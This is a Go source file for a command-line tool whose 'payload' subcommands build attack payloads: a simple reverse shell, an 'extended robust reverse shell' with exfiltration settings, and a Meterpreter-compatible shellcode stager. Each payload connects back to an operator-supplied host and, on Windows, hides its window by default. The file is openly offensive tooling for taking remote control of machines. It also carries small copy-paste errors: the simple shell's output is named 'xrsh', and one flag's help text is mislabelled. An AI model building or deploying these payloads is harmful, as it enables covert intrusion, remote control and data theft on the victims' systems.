package cmd

import (
	"fmt"
	"runtime"
	"time"

	"github.com/spf13/cobra"
)

var opts struct {
	address        string
	net            string
	arch           string
	os             string
	output         string
	noWindowsGui   bool
	verbose        bool
	exfilCfg       string
	exfilTimeout   time.Duration
	preferredShell string
}

var payloadCmd = &cobra.Command{
	Use:           "payload",
	Short:         "build a payload",
	SilenceErrors: true,
}

var reverseShellCmd = &cobra.Command{
	Use:   "rsh",
	Short: "simple reverse shell",
	Run: func(cmd *cobra.Command, args []string) {
		verbose := "false"
		if opts.verbose {
			verbose = "true"
		}

		regular := regularLDFlags{"w": "", "s": ""}
		if opts.os == "windows" && !opts.noWindowsGui {
			regular["H"] = "windowsgui"
		}
		externalVars := externalVarLDFlags{
			"address": opts.address,
			"network": opts.net,
			"verbose": verbose,
			"shell":   opts.preferredShell,
		}

		err := build([]string{
			"-ldflags", setupLDFlags(regular, externalVars),
			"-o", outputFileName("xrsh"),
			"./payloads/rsh",
		})
		if err != nil {
			fmt.Println(err)
		}
	},
}

var extendedReverseShellCmd = &cobra.Command{
	Use:   "xrsh",
	Short: "extended robust reverse shell",
	Run: func(cmd *cobra.Command, args []string) {
		noWindowsGui := "false"
		if opts.noWindowsGui {
			noWindowsGui = "true"
		}

		regular := regularLDFlags{"w": "", "s": ""}
		if opts.os == "windows" && !opts.noWindowsGui {
			regular["H"] = "windowsgui"
		}
		externalVars := externalVarLDFlags{
			"address":      opts.address,
			"network":      opts.net,
			"exfilCfg":     opts.exfilCfg,
			"exfilTimeout": opts.exfilTimeout.String(),
			"noWindowsGui": noWindowsGui,
			"shell":        opts.preferredShell,
		}

		err := build([]string{
			"-ldflags", setupLDFlags(regular, externalVars),
			"-o", outputFileName("xrsh"),
			"./payloads/xrsh",
		})
		if err != nil {
			fmt.Println(err)
		}
	},
}

var stagerCmd = &cobra.Command{
	Use:   "stager",
	Short: "meterpreter/reverse_tcp compatible shellcode stager",
	Run: func(cmd *cobra.Command, args []string) {
		regular := regularLDFlags{"w": "", "s": ""}
		if opts.os == "windows" && !opts.noWindowsGui {
			regular["H"] = "windowsgui"
		}
		externalVars := externalVarLDFlags{
			"address":      opts.address,
			"network":      opts.net,
			"exfilCfg":     opts.exfilCfg,
			"exfilTimeout": opts.exfilTimeout.String(),
		}

		err := build([]string{
			"-ldflags", setupLDFlags(regular, externalVars),
			"-o", outputFileName("stager"),
			"./payloads/stager",
		})
		if err != nil {
			fmt.Println(err)
		}
	},
}

func init() {
	payloadCmd.PersistentFlags().StringVarP(&opts.address, "destination", "d", "",
		"connect-back destination, like LHOST (host:port)")
	payloadCmd.PersistentFlags().StringVarP(&opts.net, "network", "n", "tcp", "dial network")
	payloadCmd.PersistentFlags().StringVar(&opts.arch, "arch", runtime.GOARCH, "target architecture")
	payloadCmd.PersistentFlags().StringVar(&opts.os, "os", runtime.GOOS, "target operating system")
	payloadCmd.PersistentFlags().StringVarP(&opts.output, "output", "o", "", "target operating system")
	payloadCmd.PersistentFlags().BoolVar(&opts.noWindowsGui, "nowindowsgui", false, "don't use -H=windowsgui")

	_ = payloadCmd.MarkPersistentFlagRequired("destination")

	reverseShellCmd.PersistentFlags().BoolVar(&opts.verbose, "verbose", false, "print errors to stderr")
	reverseShellCmd.PersistentFlags().StringVar(&opts.preferredShell, "shell", "", "preferred shell")

	extendedReverseShellCmd.PersistentFlags().StringVarP(&opts.exfilCfg, "exfil", "e", "", "log exfil configuration")
	extendedReverseShellCmd.PersistentFlags().DurationVar(&opts.exfilTimeout, "timeout", 3*time.Second, "exfil timeout")
	extendedReverseShellCmd.PersistentFlags().StringVar(&opts.preferredShell, "shell", "", "preferred shell")

	stagerCmd.PersistentFlags().StringVarP(&opts.exfilCfg, "exfil", "e", "", "log exfil configuration")
	stagerCmd.PersistentFlags().DurationVar(&opts.exfilTimeout, "timeout", 3*time.Second, "exfil timeout")

	payloadCmd.AddCommand(reverseShellCmd)
	payloadCmd.AddCommand(extendedReverseShellCmd)
	payloadCmd.AddCommand(stagerCmd)
}
